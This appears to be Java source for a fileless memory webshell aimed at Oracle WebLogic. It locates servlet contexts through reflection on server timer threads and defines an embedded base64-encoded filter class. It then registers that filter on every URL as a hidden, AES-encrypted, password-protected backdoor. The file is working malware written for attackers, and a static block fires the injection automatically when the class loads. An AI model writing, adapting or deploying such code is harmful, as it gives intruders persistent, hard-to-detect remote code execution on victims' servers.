package core.memshell;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class WeblogicFilterMemShell{
    private static String filterName;
    private static String className = "memshell.WeblogicFilterShell";

    public WeblogicFilterMemShell() {
        filterName = "WeblogicFilterShell";
        injectM();
    }

    public static synchronized void injectM() {
        List var0 = getContext();
        Iterator var1 = var0.iterator();
        IMC();
        while(var1.hasNext()) {
            Object var2 = var1.next();
            IMF(var2);
        }
    }
    public static synchronized void IMF(Object var0) {
        try {
            Field var1 = var0.getClass().getDeclaredField("filterManager");
            var1.setAccessible(true);
//            FilterManager var2 = (FilterManager) var1.get(var0);
            Object var2 =  var1.get(var0);

            Method var3;
            try {
                var3 = var2.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class);
                var3.setAccessible(true);
                var3.invoke(var2, filterName, className, new String[]{"/*"}, new String[0], new HashMap());
            } catch (Exception var8) {
                var3 = var2.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                var3.setAccessible(true);
                var3.invoke(var2, filterName, className, new String[]{"/*"}, new String[0], new HashMap(), new String[0]);
            }

            Field var4 = var2.getClass().getDeclaredField("filters");
            var4.setAccessible(true);
            HashMap var5 = (HashMap) var4.get(var2);
//            FilterWrapper var6 = (FilterWrapper) var5.get(filterName);
            Object var6 = var5.get(filterName);
            Method var7 = var6.getClass().getDeclaredMethod("setHeadFilter", Boolean.TYPE);
            var7.setAccessible(true);
            var7.invoke(var6, true);

        } catch (Throwable var9) {
        }

    }

    public static synchronized List<Object> getContext() {
        ArrayList var0 = new ArrayList();

        try {
            Method var1 = Thread.class.getDeclaredMethod("getThreads", (Class[])null);
            var1.setAccessible(true);
            Thread[] var2 = (Thread[])((Thread[])var1.invoke((Object)null));
            Thread[] var3 = var2;
            int var4 = var2.length;

            for(int var5 = 0; var5 < var4; ++var5) {
                Thread var6 = var3[var5];
                if (var6.getClass().getName().contains("weblogic.timers.internal.TimerThread")) {
                    try {
                        Object var7 = getFV(var6, "timerThread");

                        Object var12;
                        Object var13;
                        Object var15;
                        Object var17;
                        try {
                            Object var8 = getFV(var7, "timerTree");
                            Map var21 = (Map)var8;
                            Iterator var22 = var21.entrySet().iterator();

                            while(var22.hasNext()) {
                                Map.Entry var23 = (Map.Entry)var22.next();
                                var12 = var23.getValue();
                                var13 = getFV(var12, "listener");
                                if (var13.getClass().getName().contains("SessionContext")) {
                                    Field var24 = var13.getClass().getDeclaredField("this$0");
                                    var24.setAccessible(true);
                                    var15 = var24.get(var13);
                                    Field var25 = var15.getClass().getSuperclass().getDeclaredField("servletContext");
                                    var25.setAccessible(true);
                                    var17 = var25.get(var15);
                                    var0.add(var17);
                                }
                            }
                        } catch (Exception var18) {
                            Object var9 = getFV(var7, "managerList");
                            List var10 = (List)var9;
                            Iterator var11 = var10.iterator();

                            while(var11.hasNext()) {
                                var12 = var11.next();
                                if (var12.toString().contains("AsyncContextTimer-ContextPath=")) {
                                    var13 = getFV(var12, "timerSet");
                                    Object var14 = getFV(var13, "timers");
                                    var15 = ((List)var14).get(0);
                                    Object var16 = getFV(var15, "listener");
                                    var17 = getFV(var16, "context");
                                    var0.add(var17);
                                }
                            }
                        }
                    } catch (Exception var19) {
                    }
                }
            }
        } catch (Exception var20) {
        }

        return var0;
    }

    public static synchronized void IMC() {

        try {
            Thread.currentThread().getContextClassLoader().loadClass("memshell.WeblogicFilterShell");
        } catch (Exception var4) {
            try {
                Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                var1.setAccessible(true);
                byte[] var2 =base64Decode("yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTG1lbXNoZWxsL1dlYmxvZ2ljRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAYV2VibG9naWNGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAQbWVtc2hlbGwucGF5bG9hZAcBCAwBMwE0AQAcbWVtc2hlbGwvV2VibG9naWNGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5n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");
                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
            } catch (Throwable var3) {
            }
        }

    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
    static {
        new WeblogicFilterMemShell();
    }
}
